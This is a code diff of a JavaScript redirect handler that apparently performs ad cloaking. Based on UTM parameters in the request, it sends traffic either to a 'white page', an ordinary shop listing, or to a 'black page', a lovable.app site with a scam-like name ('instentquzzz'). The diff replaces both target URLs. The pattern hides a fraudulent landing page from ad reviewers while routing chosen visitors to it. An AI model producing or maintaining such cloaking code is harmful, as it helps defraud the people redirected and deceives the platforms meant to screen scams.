@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://bdonix.com/product/adjustable-laptop-wooden-table/?srsltid=AfmBOopyGZxJ9knlBjpUtDYuNMIuXrnDHhoq3kkBnanwqr9VNXw79C-v";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/";
+    const whitePageURL = "https://www.otto.de/p/laura-scott-strickkleid-aus-viskosemischung-mit-femininem-rueschendetail-1745017290/?variationId=1952846780";
+    const blackPageURL = "https://instentquzzz.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
